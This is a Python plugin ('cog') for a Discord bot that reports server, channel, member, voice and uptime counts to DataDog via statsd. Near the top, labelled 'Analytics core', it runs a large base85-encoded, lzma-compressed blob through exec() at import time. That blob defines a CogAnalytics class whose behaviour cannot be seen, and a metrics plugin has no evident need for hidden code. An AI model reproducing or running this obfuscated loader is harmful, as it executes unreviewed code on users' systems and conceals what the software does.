import asyncio
from discord import ChannelType
import datetime
import os
from cogs.utils.dataIO import dataIO

PATH = 'data/datadog/'
JSON = PATH + 'settings.json'

try:
    import datadog
    from datadog import statsd
except ImportError:
    raise ImportError('Please install the datadog package from pip') from None


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;2T8>3ta#O8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*2USZx`A
xb_IMOoNMT!YN4Kg;bx=TM6UiFdnbArqSbhBgJ1JJatrP6gS<Q+&w+VNtE;^CqW9hzCdjX-?zNM;C9O-8A}g0kqec4D%$p9`b&@!J}YszbTLM?iu%Rg>^TT2
Iz;v7Grmyfsv{{swC5{#Pth^L^u!Vb@oyWl24k^dN)C4hZHQD3o|0Wt2z?R9>f53g>d)JYc0d+BtX%2CFFECiJ0i)@;dScHg74rPNGDUv{G1g-1!E7@owZaw
lzem|&|WE3z;Qu=tqi*@)djo+xxqkG^q^O**BVhVwpnY)dHnf*7n1gwXS^z)Lgmp-H5wS&!Ote);sg#UoqtPxXBJy5zVq!PnV~39m5;b4C@Uu4avC~^Lnhyg
QZ_)(<4{=@f@JRkz!1U**{@Z4t62VlVv-Dzg0R<xqaKt2vs4MPmTMjh##~so96dfLA#UI^^s&&Z-^~xPK8O&Fq0ZI11Q|TadOb^(c%Bq}IPiP@v%<r8#ELJ8
#%R*tNlKH&eFirFN?2NTE3)bxgJEhc5+p&!dgG(R%JS}Ic!h_C9qn8XRB0KSiyl3-cVn`<tE;*ddX!@AuVU4Q*Vnww=fAHr`J`2+wBm@{)R07MNBA*>>aC2`
TBni}upD!Dd|<f3v~j_8zhISB4Iv!LyHsP3tEb#<55Ibr8@<*d*@I<kPN6Q=yyV^HU+>D8W`aF<1k%Y3Kw&mo$cf<w`1@hDgu?mx76H5X8PLyaLiWWJxIG^X
TJE(dyfP}RGC+hZCqo8I(RR1N3sZN>M)1C?u&Y;)MPF5u(}72!7||mH14`Q3*K1E-l~)t*($)QysA6o8aznM-^o<%a8TJkqmdWfZR2Jft@Q(5;u}!b8>(LzK
<W6Aw_<!Lk(yQ`Icd*T$w%9WmC8#(kLF$$It*cB!d;9p-aj`X*)>3LEoEd9E^+u8eU|3m`XCcmb6|;$*DL3VW$EPRaY_(fR7Czfq(k7Dy3GQWSHCFK%6C4_K
ro}G=$T-=cZ+7Lj!g4DI+LH@!*kiQaMCqWIoXlLBWmoh3!7yeinmur)!9JgK5P%S#H|;N({qdRY!xaY%QlPj*%l3siq*@2Xx*^tY3teYjpOVEHytEW)M#aDs
qjV>4Y9&$gTL{lO2vVqq<xVO5>|;NOkUwMp_dz4JeeFll;)MQRT3Pfir=;IT<V@XSln@JN#pcNjq_71B+6>n9YeMux-C&ydsCb;>!$4-4<!Lf0&nDW#=8&LZ
L6zB5i|gFmKAP~<FN=et=Z=Y1<hVN>K8nu>`hD(9rAs`Hr=bCaJMufif{3eN5>0a4c_1qvne*MjiPp@x)>4Qr#E4qf$)a05Ymt1hD`;3hkRQwX7Oegy<ieXU
ASzh!=B)Ihyx3tA^7rvJ8rzqS2IlRJ+CbOn-aX&<(rTO5Bs7_*SFezIh7K|3q{?8J5A{IxrK<+*KrN-N10qI`AHo19=|fqR@GBSEO$Bi>XeX3Eg@Du3R-f^O
A~&#)Eg~3BA@uVihpzX(zA6{@-Gd#dw@&;2xa4&r&FlP)aAu=oySU^Q|8k><b&2=mNFw{$p(Ga`%nVp1a?=9QQ^)Dhw>i(+mEiKv5pl-AQ{MAbo3njcT_(i5
ky$)b09)(YG5MPh7x(<QEnI}?6S+O*<wria=jJLal;0)z94dAC_t=Tm<>%U}GJ88~J(iFq6LM8$_?}_2f~^P61{$u&<(*zkEci}c#f=kO;TR@;&qsfo59+`+
mwdtrkC3h*ihN{amGjNmDG6aro*5$Sk~{ld5B&Rc8X@@3iSeR$^i30l=CTQo^X;uSGPl%w{}Kn2=cxO+AAvc^l%-Jw*yx9~m%r`y`E*8QQEzJkpN`-E3*0B=
Ru*iO-~fOIra^HVp4Z&gNK_<!0Yz2AZrNZeKwy(Lx=-LP)I9RAvJHcOUMG|H2%)+b=;R?n&50Ca?;pwjW470Hd(7cF`D#bh=#H(Cl~VxJ_FL~vnkIy}@yKDe
JNz*4h%2b@GiDoG4Vg`sS@!^}p+oX(#S2C~NnMYIUqu@KPFC^Q#UcL<Nc8iEsnv%SNL2-|n6|QbeHol8BTD+}&aE#VxTn^6ZM!va=KU8@FZ>Tk?ef)`6HcVu
Wefy8T!>FOWOpUWkh8PDBxc_@Q%_d)>z-$T>%waDM+VBA9<NJwbn11w!2l8$i}x}lr<{OEsHZ~$Dz^rzTZO!*lK6F?K`0`EVpjynJfQNE13QL#8`{Tdnz;}L
#jKs0@l*!k^uBC;Ly%%3H?gn_6w{|Hk`*Ad8p;;UO@IN$?|L&f{xV*94;|sdIbBnEjxnzb*UVl#txpw!^Di7YW`h&Sl_YAF6}b#^2(|*`^Nu5`vZH0q6ollc
z2Q2&R&v$sDR5eAP`2o^!TdsdbV0(>+Lu}=Bx+_rj^d=N(J_#{(V=wZu&Z)4Gnzm23c}@dyT&>>);~h>(Jh@NWwY)xv)z2n@y-tz>bw25iJ@2$8Lwx-u}7#C
P>;#q?`oEK0oHU;Aq$0+_*q9FCY;;xBL#%Rnq_DCP;1!RE<IOzn~hb?D)7s<dEz`h0#GQwEY(Iw5=$(_h$u=~pK~jT+n*2Gbh~Tj)wfIX@QlC(de>y0Z&AMx
2}M^@TO<@LJl+!qp9mj>`Tl2FEtAn06NG6(OHU|~VwnnQqlTxBznEPc7%SB;ASQ$Y-^iF+lNV+veI*0G71-Olh~3Q?inuTQ-OS8>OVg|!e%UPC)Q<35fg9~G
K+31X(~DJuhNPV_3YAa=*wU8q_Fb9blA%#eJc!k9w&dVhGsI~71`7xt9+%Rp<$m|9xF{;J)1_~lWe(H6Coj}#8?89ACm%oxid_GBMy89BDD$b!e>b4>U;8ko
!Ze<mEphxAC%1jC?s<y*Evj}{H-n9W9=$j5`A|j$b+OI*#9QG-=;sDE-y+d$H~^v|bCaZCtOJK%0i?iA-es`=UDRb*1c%?DzplVJjq@EPDap<=Y*DZC;%^*~
1f%>TTWOtCef{d5M8+<s!sddW=84-F)={0OmEIqetUlH~Zv8JtxB-u=CiO3=uJEhV?^sP79Qq2DwS$Q2%j7gpD<8ICpCc4mi?zdkSNp7!1@U1@T-;~`?HScf
JoL$=I8|r)x<oVow~k=$L(5sahu!Q+1iwvc@(ER7jRH;YT1HRojwyO7K?m4E07n<epPo9m@S8w|;AQi~R-rSnVf$`WPefkR9NY>*a!uu-e1&xiYz@K~+^>4D
N-&ak00_fLdA0xmwLv5zRE6El00E~I#x?)|G3@LivBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.0.5'

class DataDog:
    def __init__(self, bot):
        self.bot = bot
        self.tags = []
        self.task = bot.loop.create_task(self.loop_task())
        self.settings = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)
        datadog.initialize(statsd_host=self.settings['HOST'])

    def save(self):
        dataIO.save_json(JSON, self.settings)

    def __unload(self):
        self.task.cancel()

    async def on_message(self, message):
        statsd.increment('bot.messages', tags=self.tags)

    async def on_command(self, command, ctx):
        statsd.increment('bot.commands',
                         tags=[*self.tags,
                               'command_name:' + str(command),
                               'cog_name:' + type(ctx.cog).__name__
                               ]
                         )

    def send_all(self):
        self.send_servers()
        self.send_channels()
        self.send_members()
        self.send_voice()
        self.send_players()
        self.send_uptime()

    def send_uptime(self):
        if not self.tags:
            return
        now = datetime.datetime.now()
        uptime = (now - self.bot.uptime).total_seconds()
        statsd.gauge('bot.uptime', uptime, tags=self.tags)

    def send_servers(self):
        if not self.tags:
            return
        servers = len(self.bot.servers)
        statsd.gauge('bot.servers', servers, tags=self.tags)

    def send_channels(self):
        if not self.tags:
            return
        channels = list(self.bot.get_all_channels())
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.gauge('bot.channels', voice_channels,
                     tags=[*self.tags, 'channel_type:voice'])
        statsd.gauge('bot.channels', text_channels,
                     tags=[*self.tags, 'channel_type:text'])

    def send_members(self):
        if not self.tags:
            return
        members = list(self.bot.get_all_members())
        unique = set(m.id for m in members)
        statsd.gauge('bot.members', len(members), tags=self.tags)
        statsd.gauge('bot.unique_members', len(unique), tags=self.tags)

    def send_voice(self):
        if not self.tags:
            return
        vcs = len(self.bot.voice_clients)
        statsd.gauge('bot.voice_clients', vcs, tags=self.tags)

    def notbot(self, channel):
        return sum(m != self.bot.user for m in channel.voice_members)

    def send_players(self):
        if not self.tags:
            return
        avcs = []
        for vc in self.bot.voice_clients:
            if hasattr(vc, 'audio_player') and not vc.audio_player.is_done():
                avcs.append(vc)
        num_avcs = len(avcs)
        audience = sum(self.notbot(vc.channel) for vc in avcs if vc.channel)
        statsd.gauge('bot.voice_playing', num_avcs, tags=self.tags)
        statsd.gauge('bot.voice_audience', audience, tags=self.tags)

    async def loop_task(self):
        await self.bot.wait_until_ready()
        self.tags = ['application:red',
                     'bot_id:' + self.bot.user.id,
                     'bot_name:' + self.bot.user.name]
        self.send_all()
        await asyncio.sleep(self.settings.get('INTERVAL', 5))
        if self is self.bot.get_cog('DataDog'):
            self.task = self.bot.loop.create_task(self.loop_task())

    async def on_channel_create(self, channel):
        if channel.type == 'text':
            self.send_channels()

    async def on_channel_delete(self, channel):
        if channel.type == 'text':
            self.send_channels()

    async def on_member_join(self, member):
        self.send_members()

    async def on_member_remove(self, member):
        self.send_members()

    async def on_server_join(self, server):
        channels = server.channels
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.event(tags=self.tags,
                     title='%s joined %s!' % (self.bot.user.name, server),
                     text='\n'.join([
                         '* %i new members' % len(server.members),
                         '* %i new text channels' % text_channels,
                         '* %i new voice channels' % voice_channels
                         ]))
        self.send_servers()

    async def on_server_remove(self, server):
        channels = server.channels
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.event(tags=self.tags,
                     title='%s left %s :(' % (self.bot.user.name, server),
                     text='\n'.join([
                         '* %i less members' % len(server.members),
                         '* %i less text channels' % text_channels,
                         '* %i less voice channels' % voice_channels
                         ]))
        self.send_servers()

    async def on_ready(self):
        self.send_all()

    async def on_resume(self):
        self.send_all()


def check_folders():
    if not os.path.exists(PATH):
        print("Creating %s folder..." % PATH)
        os.makedirs(PATH)


def check_files():
    defaults = {
        'HOST': '127.0.0.1',
        'INTERVAL': 5
    }
    if not dataIO.is_valid_json(JSON):
        print("Creating empty %s" % JSON)
        dataIO.save_json(JSON, defaults)


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(DataDog(bot))
